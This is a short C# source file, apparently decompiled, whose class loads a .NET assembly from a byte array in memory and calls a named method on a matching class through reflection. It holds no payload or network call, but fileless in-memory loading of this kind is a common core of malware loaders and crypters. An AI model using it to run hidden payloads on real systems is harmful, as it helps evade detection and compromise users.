using System;
using System.Reflection;
using System.Runtime.CompilerServices;

namespace ns1;

internal class Class6
{
	public class Class7
	{
		private Assembly assembly_0;

		public Class7(byte[] Init)
		{
			assembly_0 = Assembly.Load(Init);
		}

		public Assembly method_0()
		{
			return assembly_0;
		}
	}

	private byte[] byte_0;

	private string string_0;

	private string string_1;

	private object[] object_0;

	public Class6(byte[] ASM, string CN, string MN, object[] args)
	{
		byte_0 = ASM;
		string_0 = CN;
		string_1 = MN;
		object_0 = args;
	}

	public void method_0()
	{
		Class7 @class = new Class7(byte_0);
		Assembly assembly = @class.method_0();
		Type[] types = assembly.GetTypes();
		foreach (Type type in types)
		{
			if (type.IsClass && type.FullName!.EndsWith("." + string_0))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
				type.InvokeMember(string_1, BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), object_0);
			}
		}
	}
}
